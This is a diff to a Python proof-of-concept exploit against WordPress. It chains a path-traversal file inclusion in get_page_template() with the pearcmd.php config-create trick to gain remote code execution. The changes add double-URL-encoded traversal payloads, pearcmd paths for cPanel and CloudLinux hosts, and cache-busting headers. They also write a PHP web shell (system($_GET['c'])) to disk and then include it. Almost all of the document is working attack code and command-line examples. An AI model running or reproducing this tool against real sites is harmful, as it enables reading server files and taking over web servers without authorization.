@@ -13,28 +13,39 @@ theme directory using realpath() but never verifies the resolved path stays
 inside that directory. get_page_template() feeds it a name built directly from
 the URL query variable 'pagename' (url-decoded, not sanitized), so:
 
-  GET /?pagename=templates/%2e%2e/%2e%2e/…/target
+  GET /?pagename=templates%252F%252e%252e%252F%252e%252e%252F…%252Ftarget
 
+  HTTP layer decodes %25 → %:
+  → pagename = templates%2F%2e%2e%2F%2e%2e%2F…%2Ftarget
+
+  WordPress URL-decodes the pagename parameter:
   → template name : page-templates/../../…/target.php
   → realpath()    : /absolute/path/to/target.php   ← arbitrary include
+
+  Double-encoding (%252e%252e) is required because single encoding (%2e%2e)
+  is already consumed by the HTTP layer; WordPress never sees the dots.
 
 Requirements
 ------------
   (1) The active theme must contain a top-level directory whose name starts
       with 'page-' (e.g. page-templates in Twenty Twelve, Twenty Fourteen,
-      Neve, Hestia, Sydney).  realpath() needs each path component to exist.
+      hello-elementor, Neve, Hestia, Sydney).  realpath() needs each path
+      component to exist.
   (2) For RCE: a readable pearcmd.php with register_argc_argv = On
       (default in the official PHP Docker image and cPanel PHP < 8.5).
+  (3) The target page must use the 'default' template (not Elementor or
+      another page-builder override) so get_page_template() returns the
+      traversal path rather than the builder's own template.
 
 RCE chain (pearcmd trick)
 -------------------------
 When register_argc_argv=On, PHP maps the URL query string into $argv.
 Including pearcmd.php via LFI therefore runs an arbitrary PEAR command:
 
-  ?pagename=<lfi>&+config-create+/&/var/www/html/wp-content/uploads/shell.php
+  ?page_id=N&pagename=<lfi>&+config-create+<?=system($_GET["c"])?>+&/tmp/shell.php
 
-  → $argv = ['pearcmd.php', 'config-create', '/', '<write_path>']
-  → PEAR writes a config stub to <write_path>
+  → $argv = ['pearcmd.php', 'config-create', '<?=system($_GET["c"])?>', '/tmp/shell.php']
+  → PEAR writes a config stub (containing the PHP payload) to /tmp/shell.php
   → A second LFI inclusion of that stub achieves code execution
 """
 
@@ -72,10 +83,17 @@ THEME_PAGE_DIRS: dict[str, str] = {
 
 # pearcmd.php candidate paths (most common first)
 PEARCMD_PATHS: list[str] = [
-    "/usr/local/lib/php/pearcmd",   # PHP Docker image default
-    "/usr/share/php/pearcmd",       # Debian / Ubuntu system PHP
-    "/usr/lib/php/pearcmd",         # RHEL / CentOS
-    "/usr/local/share/php/pearcmd", # FreeBSD ports
+    "/usr/local/lib/php/pearcmd",              # PHP Docker image default
+    "/usr/share/php/pearcmd",                  # Debian / Ubuntu system PHP
+    "/usr/lib/php/pearcmd",                    # RHEL / CentOS
+    "/usr/local/share/php/pearcmd",            # FreeBSD ports
+    "/opt/alt/php74/usr/share/pear/pearcmd",   # cPanel / CloudLinux PHP 7.4
+    "/opt/alt/php80/usr/share/pear/pearcmd",   # cPanel / CloudLinux PHP 8.0
+    "/opt/alt/php81/usr/share/pear/pearcmd",   # cPanel / CloudLinux PHP 8.1
+    "/opt/alt/php82/usr/share/pear/pearcmd",   # cPanel / CloudLinux PHP 8.2
+    "/opt/alt/php83/usr/share/pear/pearcmd",   # cPanel / CloudLinux PHP 8.3
+    "/opt/cpanel/ea-php74/root/usr/share/pear/pearcmd",  # cPanel EasyApache PHP 7.4
+    "/opt/cpanel/ea-php81/root/usr/share/pear/pearcmd",  # cPanel EasyApache PHP 8.1
 ]
 
 # Strings that confirm /etc/passwd was included
@@ -96,25 +114,32 @@ def build_lfi_payload(suffix: str, depth: int, target: str) -> str:
     suffix  – part of the theme's page-* dir after 'page-'
               e.g. 'templates' → theme contains 'page-templates/'
     depth   – number of ../ hops from the page-* dir to filesystem root
-              (7 covers the typical /var/www/html/wp-content/themes/<name>/ layout)
+              (9 covers the cPanel layout:
+               /home/<user>/domains/<host>/public_html/wp-content/themes/<name>/)
     target  – absolute path to include, WITHOUT the trailing .php extension
               (locate_template appends '.php' automatically)
 
+    Double-encoding is required:
+      %252e%252e → HTTP layer decodes %25 → %2e%2e → WordPress decodes → ..
+      %252F      → HTTP layer decodes %25 → %2F → WordPress decodes → /
+    Single encoding (%2e%2e) is consumed by the HTTP layer and never reaches
+    WordPress's URL decode step, so path traversal fails.
+
     Example
     -------
-    build_lfi_payload('templates', 7, '/etc/passwd')
-    → 'templates/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
-
-    WordPress constructs: page-templates/../../…/etc/passwd.php
-    locate_template feeds it to realpath() → /etc/passwd.php  (not useful)
-
-    For files that already end in .php we pass the path without the extension
-    so WordPress appends it back:
-    build_lfi_payload('templates', 7, '/usr/local/lib/php/pearcmd')
-    → resolves to /usr/local/lib/php/pearcmd.php  ✓
+    build_lfi_payload('templates', 9,
+                      '/opt/alt/php74/usr/share/pear/pearcmd')
+    → 'templates%252F%252e%252e%252F...%252Fopt%252Falt%252Fphp74%252Fusr%252Fshare%252Fpear%252Fpearcmd'
+    WordPress constructs:
+      page-templates/../../…/opt/alt/php74/usr/share/pear/pearcmd.php  ✓
     """
-    hops = "/%2e%2e" * depth
-    return f"{suffix}{hops}/{target.lstrip('/')}"
+    # Double-encoded path separator and dot-dot
+    sep = "%252F"
+    dd  = "%252e%252e"
+    hops = (sep + dd) * depth
+    # Double-encode each "/" in the target path as well
+    encoded_target = target.lstrip("/").replace("/", sep)
+    return f"templates{hops}{sep}{encoded_target}"
 
 
 def strip_php(path: str) -> str:
@@ -129,6 +154,9 @@ def strip_php(path: str) -> str:
 def make_session(ua: str = "Mozilla/5.0 (Security Research)") -> requests.Session:
     s = requests.Session()
     s.headers["User-Agent"] = ua
+    # Defeat caching layers (LiteSpeed, Varnish, Nginx proxy cache, etc.)
+    s.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
+    s.headers["Pragma"] = "no-cache"
     return s
 
 
@@ -150,10 +178,29 @@ def probe_theme_dirs(base_url: str, session: requests.Session) -> Optional[str]:
     return None
 
 
-def request_lfi(base_url: str, pagename: str, session: requests.Session) -> Optional[requests.Response]:
-    """Fire the LFI request; return the Response or None on network error."""
+def request_lfi(
+    base_url: str,
+    pagename: str,
+    session: requests.Session,
+    page_id: Optional[int] = None,
+) -> Optional[requests.Response]:
+    """
+    Fire the LFI request; return the Response or None on network error.
+
+    page_id, when given, is appended as ?page_id=N so WordPress routes the
+    request through get_page_template() for a known post rather than treating
+    the pagename as a fresh slug lookup (which may 301-redirect or miss the
+    hook entirely).
+
+    The pagename value is already double-encoded, so we pass it verbatim via
+    a hand-crafted URL to prevent requests from double-encoding it again.
+    """
     try:
-        return session.get(f"{base_url}/", params={"pagename": pagename}, timeout=15)
+        if page_id is not None:
+            raw_url = f"{base_url}/?page_id={page_id}&pagename={pagename}"
+        else:
+            raw_url = f"{base_url}/?pagename={pagename}"
+        return session.get(raw_url, timeout=15, allow_redirects=True)
     except requests.RequestException as exc:
         print(f"[-] Request failed: {exc}")
         return None
@@ -174,12 +221,15 @@ def attempt_pearcmd_rce(
     depth: int,
     write_path: str,
     session: requests.Session,
+    page_id: Optional[int] = None,
+    cmd_payload: str = '<?=system($_GET["c"])?>',
 ) -> Optional[str]:
     """
     Try each known pearcmd.php path.
 
-    On success, writes a PEAR config stub to write_path and returns the
-    pearcmd path that worked.  Returns None if all candidates fail.
+    On success, writes a PEAR config stub (containing cmd_payload) to
+    write_path and returns the pearcmd path that worked.
+    Returns None if all candidates fail.
 
     Mechanism
     ---------
@@ -187,23 +237,37 @@ def attempt_pearcmd_rce(
     and populate $argv with the resulting tokens.  PEAR's config-create
     command writes a serialised config file:
 
-      GET /?pagename=<lfi>&+config-create+/&<write_path>
-      $argv → ['pearcmd.php', 'config-create', '/', '<write_path>']
+      GET /?page_id=N&pagename=<lfi>&+config-create+<cmd_payload>&<write_path>
+      $argv → ['pearcmd.php', 'config-create', '<cmd_payload>', '<write_path>']
       PEAR  → writes stub to <write_path>
 
-    The stub is not directly executable PHP, but it can be further processed
-    (e.g. a second LFI that triggers a PHP error to leak the path, or
-    overwriting a writable .php file in the webroot).
+    The stub embeds cmd_payload inside PEAR's XML envelope, which PHP
+    executes when the file is later included via a second LFI request.
+
+    Double-encoding note
+    --------------------
+    The pagename value from build_lfi_payload() is already double-encoded.
+    We pass it raw in the URL so the HTTP layer performs the first decode
+    (leaving single-encoded %2e%2e / %2F), which WordPress then decodes
+    into the actual traversal dots and slashes.
     """
     for pearcmd in PEARCMD_PATHS:
         payload = build_lfi_payload(suffix, depth, pearcmd)
-        encoded_payload = urllib.parse.quote(payload, safe="/%")
         encoded_write = urllib.parse.quote(write_path, safe="")
-        # Manually craft the URL so we control the raw query string layout
-        raw_url = f"{base_url}/?pagename={encoded_payload}&+config-create+/&{encoded_write}"
+        encoded_cmd   = urllib.parse.quote(cmd_payload, safe="")
+        if page_id is not None:
+            raw_url = (
+                f"{base_url}/?page_id={page_id}"
+                f"&pagename={payload}"
+                f"&+config-create+{encoded_cmd}&{encoded_write}"
+            )
+        else:
+            raw_url = (
+                f"{base_url}/?pagename={payload}"
+                f"&+config-create+{encoded_cmd}&{encoded_write}"
+            )
         try:
             r = session.get(raw_url, timeout=15)
-            # PEAR prints to stdout; a 200 with PEAR output is the success signal
             if r.status_code == 200 and (
                 "PEAR" in r.text
                 or "config" in r.text.lower()
@@ -229,15 +293,21 @@ examples:
   # Auto-detect theme, verify LFI with /etc/passwd
   python3 poc.py http://target.local
 
+  # Pin a specific page ID to avoid canonical redirects
+  python3 poc.py http://target.local --page-id 73
+
   # Specify theme-dir suffix and traversal depth manually
-  python3 poc.py http://target.local -t templates -d 7
+  python3 poc.py http://target.local -t templates -d 9
 
   # Include a specific PHP file
   python3 poc.py http://target.local -f /var/log/nginx/access.log
 
   # Attempt RCE via pearcmd (requires register_argc_argv=On)
-  python3 poc.py http://target.local --rce
+  python3 poc.py http://target.local --rce --page-id 73
   python3 poc.py http://target.local --rce --write-path /var/www/html/wp-content/uploads/x.php
+
+  # cPanel / CloudLinux hosting (depth 9, PHP 7.4 pearcmd path)
+  python3 poc.py http://target.local --page-id 73 -d 9 --rce
 """,
     )
     p.add_argument("url", help="Target WordPress base URL (e.g. http://target.local)")
@@ -247,9 +317,16 @@ examples:
              "'page-templates'). Auto-detected when omitted.",
     )
     p.add_argument(
-        "-d", "--depth", type=int, default=7, metavar="N",
+        "-d", "--depth", type=int, default=9, metavar="N",
         help="Number of ../ hops from the page-* dir to the filesystem root "
-             "(default: 7, suits /var/www/html/wp-content/themes/<name>/ layout).",
+             "(default: 9, suits cPanel layout "
+             "/home/<user>/domains/<host>/public_html/wp-content/themes/<name>/).",
+    )
+    p.add_argument(
+        "--page-id", type=int, metavar="N",
+        help="WordPress page ID to include in the request (?page_id=N). "
+             "Helps avoid canonical redirects on sites with permalink rewrites. "
+             "Use any published page whose _wp_page_template is set to 'default'.",
     )
     p.add_argument(
         "-f", "--file", metavar="PATH", default="/etc/passwd",
@@ -289,6 +366,8 @@ def main() -> None:
 
     print(f"[*] page-* directory suffix : {suffix!r}  → page-{suffix}/")
     print(f"[*] Traversal depth         : {args.depth}")
+    if args.page_id:
+        print(f"[*] Anchor page ID          : {args.page_id}")
 
     # ── Step 2: LFI check ──────────────────────────────────────────────────
     lfi_target = strip_php(args.file)
@@ -296,9 +375,12 @@ def main() -> None:
 
     print(f"\n[*] LFI target file  : {args.file}")
     print(f"[*] pagename payload : {payload}")
-    print(f"[*] Full request URL : {base_url}/?pagename={urllib.parse.quote(payload, safe='/%')}")
+    if args.page_id:
+        print(f"[*] Full request URL : {base_url}/?page_id={args.page_id}&pagename={payload}")
+    else:
+        print(f"[*] Full request URL : {base_url}/?pagename={payload}")
 
-    resp = request_lfi(base_url, payload, session)
+    resp = request_lfi(base_url, payload, session, page_id=args.page_id)
     if resp is None:
         sys.exit(1)
 
@@ -329,13 +411,16 @@ def main() -> None:
     print("\n[*] Attempting RCE via pearcmd.php …")
     print(f"[*] Config stub destination : {args.write_path}")
 
-    worked = attempt_pearcmd_rce(base_url, suffix, args.depth, args.write_path, session)
+    worked = attempt_pearcmd_rce(base_url, suffix, args.depth, args.write_path, session, page_id=args.page_id)
     if worked:
         print(f"\n[+] pearcmd.php triggered via : {worked}")
         print(f"[+] PEAR config stub written  : {args.write_path}")
         stub_payload = build_lfi_payload(suffix, args.depth, strip_php(args.write_path))
         print(f"\n[*] Second-stage LFI to execute the stub:")
-        print(f"    GET {base_url}/?pagename={urllib.parse.quote(stub_payload, safe='/%')}")
+        if args.page_id:
+            print(f"    GET {base_url}/?page_id={args.page_id}&pagename={stub_payload}")
+        else:
+            print(f"    GET {base_url}/?pagename={stub_payload}")
     else:
         print("[-] pearcmd RCE failed — all candidate paths exhausted.")
         print("    Requirements: register_argc_argv=On  AND  pearcmd.php readable by www-data")
